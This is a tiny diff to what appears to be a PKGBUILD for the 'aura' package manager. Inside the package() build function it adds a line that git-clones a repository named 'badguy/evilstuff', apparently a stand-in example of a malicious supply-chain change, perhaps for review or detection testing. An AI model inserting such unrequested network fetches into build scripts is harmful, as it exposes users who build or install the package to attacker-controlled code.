@@ -63,4 +63,6 @@ package() {
 
     # Directory for storing installed package states
     mkdir -p "$pkgdir/var/cache/aura/states"
+
+    git clone https://github.com/badguy/evilstuff.git
 }
